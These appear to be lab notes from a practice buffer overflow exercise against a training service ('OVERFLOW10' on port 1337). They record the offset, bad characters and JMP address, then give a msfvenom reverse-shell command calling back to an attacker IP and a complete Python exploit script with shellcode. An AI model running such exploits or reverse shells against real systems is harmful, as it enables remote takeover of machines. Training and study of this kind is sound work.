## fuzzing

![[Pasted image 20210530162755.png]]

## offset

EIP: 41397241

offset: 537

![[Pasted image 20210530162937.png]]

## bad chars

create a new fresh byte array if continuing from 9th exploit 

`!mona bytearray -b "\x00"`

ESP: 0188FA30

bad chars: `\x00\xa0\xad\xbe\xde\xef`

![[Pasted image 20210530163550.png]]


## jmp point

625011AF

little endian: `\xaf\x11\x50\x62`

![[Pasted image 20210530163718.png]]

## exploit

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\xa0\xad\xbe\xde\xef"`

![[Pasted image 20210530164037.png]]

```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x33\xab\xb2\x2a\x83\xee\xfc\xe2\xf4\xcf\x43\x30\x2a\x33\xab"
"\xd2\xa3\xd6\x9a\x72\x4e\xb8\xfb\x82\xa1\x61\xa7\x39\x78\x27"
"\x20\xc0\x02\x3c\x1c\xf8\x0c\x02\x54\x1e\x16\x52\xd7\xb0\x06"
"\x13\x6a\x7d\x27\x32\x6c\x50\xd8\x61\xfc\x39\x78\x23\x20\xf8"
"\x16\xb8\xe7\xa3\x52\xd0\xe3\xb3\xfb\x62\x20\xeb\x0a\x32\x78"
"\x39\x63\x2b\x48\x88\x63\xb8\x9f\x39\x2b\xe5\x9a\x4d\x86\xf2"
"\x64\xbf\x2b\xf4\x93\x52\x5f\xc5\xa8\xcf\xd2\x08\xd6\x96\x5f"
"\xd7\xf3\x39\x72\x17\xaa\x61\x4c\xb8\xa7\xf9\xa1\x6b\xb7\xb3"
"\xf9\xb8\xaf\x39\x2b\xe3\x22\xf6\x0e\x17\xf0\xe9\x4b\x6a\xf1"
"\xe3\xd5\xd3\xf4\xed\x70\xb8\xb9\x59\xa7\x6e\xc3\x81\x18\x33"
"\xab\xda\x5d\x40\x99\xed\x7e\x5b\xe7\xc5\x0c\x34\x54\x67\x92"
"\xa3\xaa\xb2\x2a\x1a\x6f\xe6\x7a\x5b\x82\x32\x41\x33\x54\x67"
"\x7a\x63\xfb\xe2\x6a\x63\xeb\xe2\x42\xd9\xa4\x6d\xca\xcc\x7e"
"\x25\x40\x36\xc3\xb8\x3b\x37\x7b\xda\x28\x33\x88\x9b\xa3\xd5"
"\xc1\xa2\x7c\x64\xc3\x2b\x8f\x47\xca\x4d\xff\xb6\x6b\xc6\x26"
"\xcc\xe5\xba\x5f\xdf\xc3\x42\x9f\x91\xfd\x4d\xff\x5b\xc8\xdf"
"\x4e\x33\x22\x51\x7d\x64\xfc\x83\xdc\x59\xb9\xeb\x7c\xd1\x56"
"\xd4\xed\x77\x8f\x8e\x2b\x32\x26\xf6\x0e\x23\x6d\xb2\x6e\x67"
"\xfb\xe4\x7c\x65\xed\xe4\x64\x65\xfd\xe1\x7c\x5b\xd2\x7e\x15"
"\xb5\x54\x67\xa3\xd3\xe5\xe4\x6c\xcc\x9b\xda\x22\xb4\xb6\xd2"
"\xd5\xe6\x10\x52\x37\x19\xa1\xda\x8c\xa6\x16\x2f\xd5\xe6\x97"
"\xb4\x56\x39\x2b\x49\xca\x46\xae\x09\x6d\x20\xd9\xdd\x40\x33"
"\xf8\x4d\xff"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```